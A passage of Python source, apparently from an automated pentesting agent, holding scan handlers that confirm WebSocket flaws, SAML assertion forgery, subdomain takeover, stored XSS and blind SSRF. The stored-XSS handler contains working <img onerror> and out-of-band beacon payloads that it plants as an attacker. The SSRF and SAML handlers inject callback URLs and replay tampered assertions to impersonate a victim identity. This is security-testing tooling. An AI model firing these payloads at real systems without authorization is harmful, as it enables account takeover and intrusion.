        # sensitive transport (CWE-319). Fall back to a generic origin-validation CWE.
        tech_map = {
            "cswsh": ("CWE-1385", VulnClass.CSRF),
            "missing_auth": ("CWE-346", VulnClass.BROKEN_ACCESS_CONTROL),
            "unencrypted_transport": ("CWE-319", VulnClass.VULN_SCAN),
        }

        minted: List[Vulnerability] = []
        for r in results:
            if not getattr(r, "confirmed", False):
                continue
            cwe, vclass = tech_map.get(r.technique, ("CWE-346", VulnClass.VULN_SCAN))
            vuln = Vulnerability(
                cwe=cwe,
                vuln_type=vclass,
                severity=Severity.HIGH,
                title=f"WebSocket security flaw confirmed ({r.technique})",
                description=(
                    f"WebSocketTester confirmed a real flaw against {url} via the "
                    f"{r.technique} oracle: {getattr(r, 'detail', '')}"
                ),
                evidence=[
                    {
                        "type": "websocket_flaw",
                        "provenance": "websocket_tester",
                        "technique": r.technique,
                        "detail": getattr(r, "detail", ""),
                        "tester_evidence": getattr(r, "evidence", {}),
                    }
                ],
                tool_source="websocket_scan",
                confidence=0.95,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
                minted.append(vuln)
            except Exception as e:
                logger.error("websocket_persist_failed", vuln_id=vuln.id, error=str(e))
            logger.info("websocket_confirmed", technique=r.technique)

        return {
            "status": "success",
            "tool": "websocket_scan",
            "results_checked": len(results),
            "confirmed": len(minted) > 0,
            "findings_count": len(minted),
            "findings": [v.model_dump() for v in minted],
        }

    async def _execute_saml_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm SAML assertion-forgery flaws (XSW / unsigned / replay /
        comment-injection) with SAMLTester by replaying tampered SAMLResponses
        against a real ACS and confirming only when the attacker identity is
        actually granted a session. Mints ONE Vulnerability per result with
        confirmed == True.

        Payload:
            acs_url        Assertion Consumer Service endpoint (required)
            saml_response  sample SAMLResponse (raw XML or base64) (required)
            victim_nameid  privileged identity to impersonate
            attacker_nameid attacker-controlled sentinel identity
            relay_state    optional RelayState value
            param          form param name (default "SAMLResponse")
            method         HTTP method (default "POST")
            engagement_id  injected by _execute
        """
        from ai_osop.core.saml_tester import SAMLTester

        acs_url = payload.get("acs_url")
        saml_response = payload.get("saml_response")
        if not acs_url:
            raise AgentException("saml_scan requires 'acs_url'")
        if not saml_response:
            raise AgentException("saml_scan requires 'saml_response'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("saml_scan: cannot determine engagement_id")

        kwargs: Dict[str, Any] = {}
        for k in ("victim_nameid", "attacker_nameid", "relay_state", "param", "method"):
            if payload.get(k) is not None:
                kwargs[k] = payload[k]
        tester = SAMLTester(acs_url, saml_response, **kwargs)
        results = await tester.run()

        minted: List[Vulnerability] = []
        for r in results:
            if not getattr(r, "confirmed", False):
                continue
            vuln = Vulnerability(
                cwe="CWE-347",  # Improper Verification of Cryptographic Signature
                vuln_type=VulnClass.AUTHENTICATION_WEAKNESS,
                severity=Severity.CRITICAL,
                title=f"SAML assertion forgery confirmed ({r.technique})",
                description=(
                    f"SAMLTester replayed a tampered SAMLResponse against {acs_url} and the "
                    f"ACS granted a session for the attacker identity "
                    f"'{getattr(r, 'attacker_identity', '')}' via {r.technique}: "
                    f"{getattr(r, 'detail', '')}"
                ),
                evidence=[
                    {
                        "type": "saml_assertion_forgery",
                        "provenance": "saml_tester",
                        "technique": r.technique,
                        "detail": getattr(r, "detail", ""),
                        "attacker_identity": getattr(r, "attacker_identity", ""),
                        "tester_evidence": getattr(r, "evidence", {}),
                    }
                ],
                tool_source="saml_scan",
                confidence=0.97,
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
                minted.append(vuln)
            except Exception as e:
                logger.error("saml_persist_failed", vuln_id=vuln.id, error=str(e))
            logger.info("saml_confirmed", technique=r.technique)

        return {
            "status": "success",
            "tool": "saml_scan",
            "results_checked": len(results),
            "confirmed": len(minted) > 0,
            "findings_count": len(minted),
            "findings": [v.model_dump() for v in minted],
        }

    async def _probe_host_for_takeover(self, host: str):
        """Fetch a host over http/https and best-effort resolve its CNAME aliases.
        Returns (response_body, cnames). Network errors yield ("", [])."""
        import socket

        cnames: List[str] = []
        try:
            _name, aliases, _ips = socket.gethostbyname_ex(host)
            cnames = list(aliases or [])
        except Exception:
            cnames = []
        body = ""
        for scheme in ("https", "http"):
            try:
                async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12) as c:
                    resp = await c.get(f"{scheme}://{host}/")
                    body = resp.text
                    if body:
                        break
            except Exception:
                continue
        return body, cnames

    async def _execute_subdomain_takeover_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Detect dangling subdomains pointing at unclaimed third-party services.

        For each host, fetch it and match the response against provider-specific
        "unclaimed resource" signatures (NoSuchBucket, "There isn't a GitHub Pages
        site here", "No such app", ...). A signature match => takeover-able =>
        validated finding. Bare 404s never match (false positives get reports
        rejected). High-accept, low-duplicate recon-tier bounty.

        Payload:
            hosts          list of hostnames (or 'host' for one)
            engagement_id  injected by _execute
        """
        from ai_osop.core.takeover_fingerprints import match_takeover

        hosts = payload.get("hosts")
        if not hosts:
            single = payload.get("host") or payload.get("target")
            hosts = [single] if single else []
        if not hosts:
            raise AgentException("subdomain_takeover_scan requires 'hosts' (list) or 'host'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("subdomain_takeover_scan: cannot determine engagement_id")

        minted = []
        for host in hosts:
            try:
                body, cnames = await self._probe_host_for_takeover(host)
            except Exception as e:
                logger.warning("takeover_probe_failed", host=host, error=str(e))
                continue
            m = match_takeover(host, cnames, body)
            if not m:
                continue
            vuln = Vulnerability(
                cwe="CWE-350",  # Reliance on Reverse DNS Resolution... (takeover class)
                vuln_type=VulnClass.SUBDOMAIN_TAKEOVER,
                severity=Severity.HIGH,
                title=f"Subdomain takeover ({m['service']}) on {host}",
                description=(
                    f"{host} points at an unclaimed {m['service']} resource "
                    f"(signature: '{m['signature']}'"
                    + (f"; CNAME confirms the provider" if m["cname_match"] else "")
                    + "). The dangling reference can be claimed by an attacker to serve "
                    "content under this domain."
                ),
                evidence=[
                    {
                        "type": "subdomain_takeover",
                        "provenance": "http_fingerprint",
                        **m,
                    }
                ],
                tool_source="subdomain_takeover_scan",
                confidence=m["confidence"],
                validated=True,
                exploitability="high",
                impact="high",
                engagement_id=engagement_id,
            )
            try:
                await self.ctx.graph_memory.add_vulnerability(vuln)
                self.findings[vuln.id] = vuln
                minted.append(vuln)
            except Exception as e:
                logger.error("takeover_persist_failed", vuln_id=vuln.id, error=str(e))
            logger.info("subdomain_takeover_confirmed", host=host, service=m["service"])

        return {
            "status": "success",
            "tool": "subdomain_takeover_scan",
            "hosts_scanned": len(hosts),
            "confirmed": len(minted) > 0,
            "findings_count": len(minted),
            "findings": [v.model_dump() for v in minted],
        }

    async def _store_payload(
        self,
        store_url: str,
        method: str,
        field: str,
        value: str,
        base: Dict[str, Any],
        fmt: str,
        headers: Dict[str, str],
    ) -> None:
        """Persist a payload into a stored sink as the attacker (best-effort)."""
        body = {**base, field: value}
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=20) as c:
                if fmt == "form":
                    await c.request(method, store_url, data=body, headers=headers)
                else:
                    await c.request(method, store_url, json=body, headers=headers)
        except Exception as e:
            logger.warning("stored_xss_store_failed", url=store_url, error=str(e))

    async def _execute_stored_xss_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm STORED XSS: persist a payload as the attacker, then confirm it
        executes when a DIFFERENT context renders the consuming page. Never a
        template/reflection guess.

        Tiers:
          1. browser-render execution (primary): store an <img onerror> marker
             payload, render `render_url` in a real browser as the victim identity,
             eval the marker global. Set => CONFIRMED stored-XSS execution.
          2. OAST beacon (fallback / blind): store an <img src={oast_callback}>
             payload; when the consuming page is rendered (by us triggering it, or a
             real victim later), the beacon fires => OAST callback => CONFIRMED blind
             stored XSS.

        Payload:
            store_url, store_method(POST), store_field, store_format(json|form),
            store_base(dict), token/cookie (attacker auth)
            render_url    page that displays the stored content
            mode          auto|browser|oast (default auto)
            engagement_id injected by _execute; poll_seconds/poll_interval (oast)
        """
        store_url = payload.get("store_url")
        store_field = payload.get("store_field")
        render_url = payload.get("render_url")
        if not (store_url and store_field):
            raise AgentException("stored_xss_scan requires 'store_url' and 'store_field'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("stored_xss_scan: cannot determine engagement_id")

        store_method = payload.get("store_method", "POST").upper()
        store_format = payload.get("store_format", "json")
        store_base = dict(payload.get("store_base") or {})
        mode = payload.get("mode", "auto")
        auth_token = payload.get("token")
        cookie = payload.get("cookie")
        poll_seconds = float(payload.get("poll_seconds", 15))
        poll_interval = float(payload.get("poll_interval", 1.5))

        session = await self.ctx.session_memory.get_session_state(engagement_id)
        if session and hasattr(self, "browser_adapter"):
            try:
                await self.browser_adapter.initialize(session.scope, session.session_id)
            except Exception:
                pass

        headers: Dict[str, str] = {}
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
            headers["Cookie"] = f"token={auth_token}"
        if cookie:
            headers["Cookie"] = cookie

        method = "execution"
        proof: Dict[str, Any] = {}

        # Tier 1: browser-render execution.
        executed = False
        if mode in ("auto", "browser") and render_url:
            token = f"OSOPSXSS{uuid.uuid4().hex[:10]}"
            exec_payload = f"<img src=x onerror=\"window.__osopxss='{token}'\">"
            await self._store_payload(
                store_url,
                store_method,
                store_field,
                exec_payload,
                store_base,
                store_format,
                headers,
            )
            executed = await self._confirm_xss_execution(render_url, token, engagement_id)
            if executed:
                proof = {"method": "execution", "render_url": render_url, "token": token}

        # Tier 2: OAST beacon (blind / when we can't see the render).
        beaconed = False
        if not executed and mode in ("auto", "oast"):
            method = "oast_beacon"
            xss_ctx = OASTProbe(
                engagement_id=engagement_id,
                vuln_class=VulnClass.XSS,
                injection_point=store_field or "field",
                request_summary=f"{store_method} {store_url}",
                source_agent_id=getattr(self, "agent_id", "") or "",
            ).to_context()
            otoken, callback_url = await self.oast.register(
                label=f"stored_xss:{store_url}", context=xss_ctx
            )
            beacon_payload = f'<img src="{callback_url}">'
            await self._store_payload(
                store_url,
                store_method,
                store_field,
                beacon_payload,
                store_base,
                store_format,
                headers,
            )
            # Trigger a render ourselves if we have a page that displays it.
            if render_url and hasattr(self, "browser_adapter"):
                try:
                    await self.browser_adapter.navigate(
                        render_url,
                        user_label=payload.get("render_user_label", "victim"),
                        engagement_id=engagement_id,
                    )
                except Exception as e:
                    logger.warning("stored_xss_render_failed", url=render_url, error=str(e))
            hits: List[Dict[str, Any]] = []
            waited = 0.0
            while waited < poll_seconds:
                try:
                    hits = await self.oast.poll(otoken)
                except Exception:
                    break
                if hits:
                    break
                await asyncio.sleep(poll_interval)
                waited += poll_interval
            if hits:
                beaconed = True
                proof = {
                    "method": "oast_beacon",
                    "callback_url": callback_url,
                    "interaction": hits[0],
                }

        if not (executed or beaconed):
            logger.info("stored_xss_clean", store_url=store_url)
            return {
                "status": "success",
                "tool": "stored_xss_scan",
                "target": store_url,
                "confirmed": False,
                "findings_count": 0,
            }

        vuln = Vulnerability(
            cwe="CWE-79",
            vuln_type=VulnClass.XSS,
            severity=Severity.HIGH,
            title=f"Stored XSS (confirmed via {method})",
            description=(
                f"A payload stored via {store_url} (field '{store_field}') was confirmed to "
                + (
                    "execute in a real browser when the consuming page was rendered."
                    if method == "execution"
                    else "beacon out-of-band when the consuming page was rendered (blind stored XSS)."
                )
                + f" Render surface: {render_url or 'n/a'}."
            ),
            evidence=[
                {
                    "type": "stored_xss_confirmation",
                    "provenance": "browser" if method == "execution" else "oast",
                    "stored": True,
                    "method": method,
                    "store_url": store_url,
                    "store_field": store_field,
                    "render_url": render_url,
                    **proof,
                }
            ],
            tool_source="stored_xss_scan",
            confidence=0.97 if method == "execution" else 0.95,
            validated=True,
            exploitability="high",
            impact="high",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("stored_xss_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info("stored_xss_confirmed", store_url=store_url, method=method)
        return {
            "status": "success",
            "tool": "stored_xss_scan",
            "target": store_url,
            "confirmed": True,
            "method": method,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    async def _execute_ssrf_scan(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Confirm blind SSRF via a real out-of-band callback. Inject our OAST
        callback URL into a server-side URL-fetch sink (query param OR POST body
        field), trigger it, then poll the OAST server. A captured callback is proof
        the server made the request -> validated SSRF. No callback => no finding.

        Payload:
            url           the request URL sent to the target
            param         query parameter to inject into (GET URL-fetch sinks), OR
            body_field    JSON body field to set to the callback (POST/PUT sinks)
            base_body     other body fields for the request (with body_field)
            method        HTTP method (default GET, or POST when body_field set)
            token/cookie  auth credential
            poll_seconds  total poll window (default 15), poll_interval (default 1.5)
            engagement_id injected by _execute
        """
        url = payload.get("url") or payload.get("target_url") or payload.get("target")
        if not url:
            raise AgentException("ssrf_scan requires 'url'")
        engagement_id = payload.get("engagement_id") or (
            self.ctx.current_task.engagement_id if self.ctx.current_task else None
        )
        if not engagement_id:
            raise AgentException("ssrf_scan: cannot determine engagement_id")

        param = payload.get("param")
        body_field = payload.get("body_field")
        body_format = payload.get("body_format", "json")  # "json" | "form"
        method = payload.get("method", "POST" if body_field else "GET").upper()
        base_body = dict(payload.get("base_body") or {})
        auth_token = payload.get("token")
        cookie = payload.get("cookie")
        poll_seconds = float(payload.get("poll_seconds", 15))
        poll_interval = float(payload.get("poll_interval", 1.5))

        session = await self.ctx.session_memory.get_session_state(engagement_id)
        if session:
            await self.oast.initialize(session.scope, session.session_id)

        # Attach probe provenance so a captured callback -- even a late one drained
        # by the reconciler after this scan returns -- can be attributed to this
        # exact injection point and engagement.
        ssrf_ctx = OASTProbe(
            engagement_id=engagement_id,
            vuln_class=VulnClass.SSRF,
            injection_point=body_field or param or "url",
            request_summary=f"{method} {url}",
            source_agent_id=getattr(self, "agent_id", "") or "",
        ).to_context()
        token, callback_url = await self.oast.register(label=f"ssrf:{url}", context=ssrf_ctx)

        headers: Dict[str, str] = {}
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
            headers["Cookie"] = f"token={auth_token}"
        if cookie:
            headers["Cookie"] = cookie

        # Trigger the sink. A connection error here does NOT abort the scan — the
        # OAST callback is the signal, not this response.
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=20) as c:
                if body_field:
                    body = {**base_body, body_field: callback_url}
                    if body_format == "form":
                        await c.request(method, url, data=body, headers=headers)
                    else:
                        await c.request(method, url, json=body, headers=headers)
                else:
                    inj = self._inject_payload(url, callback_url, param)
                    await c.request(method, inj, headers=headers)
        except Exception as e:
            logger.warning("ssrf_trigger_request_failed", url=url, error=str(e))

        # Poll for the out-of-band callback.
        hits: List[Dict[str, Any]] = []
        waited = 0.0
        while waited < poll_seconds:
            try:
                hits = await self.oast.poll(token)
            except Exception as e:
                logger.warning("ssrf_poll_failed", token=token, error=str(e))
                break
            if hits:
                break
            await asyncio.sleep(poll_interval)
            waited += poll_interval

        if not hits:
            logger.info("ssrf_scan_clean", url=url)
            return {
                "status": "success",
                "tool": "ssrf_scan",
                "target": url,
                "confirmed": False,
                "findings_count": 0,
            }

        hit = hits[0]
        vuln = Vulnerability(
            cwe="CWE-918",
            vuln_type=VulnClass.SSRF,
            severity=Severity.HIGH,
            title=f"Blind SSRF via {body_field or param or 'parameter'}",
            description=(
                f"The server at {url} fetched an attacker-controlled URL; an out-of-band "
                f"callback was captured at the OAST server (source {hit.get('source_ip')}, "
                f"method {hit.get('method')}, path {hit.get('path')}), proving server-side "
                f"request forgery."
            ),
            evidence=[
                {
                    "type": "ssrf_callback",
                    "provenance": "oast",
                    "url": url,
                    "callback_url": callback_url,
                    "injection": body_field or param,
                    "interaction": hit,
                }
            ],
            tool_source="oast_ssrf",
            confidence=0.97,
            validated=True,
            exploitability="high",
            impact="high",
            engagement_id=engagement_id,
        )
        try:
            await self.ctx.graph_memory.add_vulnerability(vuln)
            self.findings[vuln.id] = vuln
        except Exception as e:
            logger.error("ssrf_scan_persist_failed", vuln_id=vuln.id, error=str(e))

        logger.info("ssrf_scan_confirmed", url=url, source_ip=hit.get("source_ip"))
        return {
            "status": "success",
            "tool": "ssrf_scan",
            "target": url,
            "confirmed": True,
            "findings_count": 1,
            "findings": [vuln.model_dump()],
        }

    async def _token_from_session(self, engagement_id: str, user_label: str) -> Optional[str]:
        """Best-effort: pull a bearer token from a stored session's metadata."""
        try:
            sess = await self.session_store.get_session_or_none(engagement_id, user_label)
        except Exception:
            return None
        if not sess:
            return None
        meta = getattr(sess, "metadata", {}) or {}
        return meta.get("token") or meta.get("bearer") or meta.get("jwt")

    async def _execute_correlation(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Correlate findings across tools."""
        engagement_id = payload["engagement_id"]

        # Get correlations from graph memory
        correlations = await self.ctx.graph_memory.correlate_vulnerabilities(engagement_id)

        # Cross-tool confirmation
        confirmed_findings = []
        for vuln in self.findings.values():
            # Check if confirmed by multiple tools
            similar = await self._find_similar_findings(vuln)
            if len(similar) > 1:
                vuln.confidence = 0.95
                vuln.correlated_ids = [s.id for s in similar if s.id != vuln.id]
                confirmed_findings.append(vuln)

        return {
            "status": "success",
            "correlations": correlations,
            "confirmed_findings": len(confirmed_findings),
            "confirmed_details": [v.model_dump() for v in confirmed_findings],
        }

    async def _execute_triage(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Triage a finding for false positive assessment."""
        finding_id = payload["finding_id"]

        vuln = self.findings.get(finding_id)
        if not vuln:
            return {"status": "error", "error": f"Finding {finding_id} not found"}

        # Check against false positive patterns
        is_fp = await self._check_false_positive(vuln)

        if is_fp:
            vuln.confidence = 0.1
            vuln.metadata["triage_result"] = "likely_false_positive"
        else:
            vuln.metadata["triage_result"] = "confirmed"

        return {
            "status": "success",
            "finding_id": finding_id,
            "triage_result": vuln.metadata["triage_result"],
            "confidence": vuln.confidence,
        }

    # Template classes whose nuclei matches are especially prone to catch-all FPs:
    # they assert existence/success from a generic response, which a wildcard host
    # returns for everything.
    _FP_PRONE_TEMPLATE_MARKERS = (
        "default-login",
        "default-credential",
        "-detect",
        "detection",
        "-panel",
        "login-panel",
        "takeover",
        "exposure",
        "wildcard",
    )

    async def _detect_catch_all(self, base_url: str) -> Dict[str, Any]:
        """Probe random non-existent paths to detect catch-all / wildcard hosts.

        A host that answers 2xx with a substantive body for random garbage paths
        makes "got a 200" meaningless, so nuclei status/word matchers fire on the
        generic page and produce false positives. Returns a baseline used to
        down-rank such findings. Best-effort: any failure -> is_catch_all False
        (never blocks the scan).
        """
        import uuid
        from urllib.parse import urlparse

        try:
            import httpx
        except Exception:  # pragma: no cover - httpx is a hard dep at runtime
            return {"is_catch_all": False}

        parsed = urlparse(base_url if "://" in base_url else f"https://{base_url}")
        origin = f"{parsed.scheme or 'https'}://{parsed.netloc or parsed.path}"
        probes = [
            f"{origin}/{uuid.uuid4().hex}",
            f"{origin}/{uuid.uuid4().hex}/{uuid.uuid4().hex}.aspx",
        ]
        statuses: List[int] = []
        lengths: List[int] = []
        try:
            async with httpx.AsyncClient(
                timeout=10.0, follow_redirects=True, verify=False
            ) as client:
                for u in probes:
                    try:
                        r = await client.get(u, headers={"User-Agent": "AI-OSOP-FP-Probe/1.0"})
                        statuses.append(r.status_code)
                        lengths.append(len(r.content))
                    except Exception:
                        continue
        except Exception as e:
            logger.debug(f"catch_all_probe_failed: {e}")
            return {"is_catch_all": False}

        avg_len = int(sum(lengths) / len(lengths)) if lengths else 0
        # Catch-all iff every random path returned 2xx with a real (non-trivial) body.
        is_catch_all = bool(statuses) and all(200 <= s < 300 for s in statuses) and avg_len > 200
        return {
            "is_catch_all": is_catch_all,
            "baseline_status": statuses[0] if statuses else None,
            "baseline_len": avg_len,
            "probes": probes,
        }

    def _apply_catch_all_fp_downrank(self, vuln: Vulnerability, catch_all: Dict[str, Any]) -> None:
        """Down-rank a finding that is likely a catch-all false positive.

        Lowers confidence and demotes exploitability (so it will not pass the
        exploitation gate's confidence floor) and records a transparent
        false_positive_signal in the evidence — the original finding/severity is
        preserved for the report, never silently deleted.
        """
        ev = vuln.evidence[0] if getattr(vuln, "evidence", None) else {}
        template = str(ev.get("template", "")).lower()
        resp = ev.get("response") or ""
        baseline_len = int(catch_all.get("baseline_len", 0) or 0)

        reasons: List[str] = []
        if any(m in template for m in self._FP_PRONE_TEMPLATE_MARKERS):
            reasons.append(f"catch_all_host + fp_prone_template:{template or 'unknown'}")
        if resp and baseline_len and abs(len(resp) - baseline_len) / max(baseline_len, 1) < 0.25:
            reasons.append("matched_response_indistinguishable_from_catch_all_baseline")

        if not reasons:
            return

        vuln.confidence = min(getattr(vuln, "confidence", 1.0), 0.2)
        vuln.exploitability = "low"
        if isinstance(ev, dict):
            ev["false_positive_signal"] = {
                "catch_all": True,
                "reasons": reasons,
                "baseline_status": catch_all.get("baseline_status"),
                "baseline_len": baseline_len,
            }
            if getattr(vuln, "evidence", None):
                vuln.evidence[0] = ev

    def _normalize_nuclei_finding(self, finding: Dict[str, Any]) -> Vulnerability:
        """Convert Nuclei finding to Vulnerability model."""
        severity_map = {
            "critical": Severity.CRITICAL,
            "high": Severity.HIGH,
            "medium": Severity.MEDIUM,
            "low": Severity.LOW,
            "info": Severity.INFO,
        }

        # nuclei -jsonl uses hyphenated keys and nests metadata under "info".
        # Read the real field names (with underscore fallbacks for safety).
        info = finding.get("info", {}) or {}
        template_id = finding.get("template-id") or finding.get("template_id", "")
        severity_str = (info.get("severity") or finding.get("severity") or "info").lower()
        vuln_type = self._map_nuclei_to_vuln_class(template_id)

        classification = info.get("classification", {}) or {}
        cwe = classification.get("cwe-id") or finding.get("cwe")
        if isinstance(cwe, list):
            cwe = cwe[0] if cwe else None

        matched_at = finding.get("matched-at") or finding.get("matched_at")
        extracted = finding.get("extracted-results") or finding.get("extracted_results")

        return Vulnerability(
            cwe=cwe,
            vuln_type=vuln_type,
            severity=severity_map.get(severity_str, Severity.INFO),
            title=info.get("name", "Unknown"),
            description=info.get("description", ""),
            evidence=[
                {
                    "type": "nuclei_finding",
                    "template": template_id,
                    "matched_at": matched_at,
                    "url": finding.get("url") or finding.get("host"),
                    "request": finding.get("request"),
                    "response": finding.get("response"),
                    "extracted_results": extracted,
                }
            ],
            tool_source="nuclei",
            endpoint_id=finding.get("endpoint_id"),
            confidence=0.90 if finding.get("matcher-name") else 0.75,
            exploitability="high" if severity_str in ("critical", "high") else "medium",
            engagement_id="",
        )

    def _map_nuclei_to_vuln_class(self, template_id: str) -> VulnClass:
        """Map Nuclei template ID to VulnClass."""
        if "sql" in template_id.lower():
            return VulnClass.SQLI
        elif "xss" in template_id.lower():
            return VulnClass.XSS
        elif "ssrf" in template_id.lower():
            return VulnClass.SSRF
        elif "cve" in template_id.lower():
            return VulnClass.RCE  # Default for CVEs
        elif "jwt" in template_id.lower():
            return VulnClass.JWT_ABUSE
        elif "idor" in template_id.lower():
            return VulnClass.IDOR
        # Do NOT default unmapped templates to RCE — most nuclei templates are
        # technology/exposure detections, and defaulting to RCE both inflates
        # perceived severity and poisons downstream finding-classification
        # (everything would look like an exploit class). Unknown is honest.
        return VulnClass.UNKNOWN

    async def _find_similar_findings(self, vuln: Vulnerability) -> List[Vulnerability]:
        """Find similar findings for cross-tool confirmation."""
        similar = []
        for other in self.findings.values():
            if other.id == vuln.id:
                continue
            if other.vuln_type == vuln.vuln_type and other.endpoint_id == vuln.endpoint_id:
                similar.append(other)
        return similar

    async def _check_false_positive(self, vuln: Vulnerability) -> bool:
        """Check if finding matches known false positive patterns."""
        # Check against historical patterns
        for pattern in self.false_positive_patterns:
            if pattern in vuln.title.lower() or pattern in vuln.description.lower():
                return True

        # Check tool-specific heuristics
        if vuln.tool_source == "burp_scanner" and vuln.confidence < 0.8:
            # Low confidence Burp findings are more likely FP
            return True

        return False

    async def _cleanup_resources(self) -> None:
        self.findings.clear()
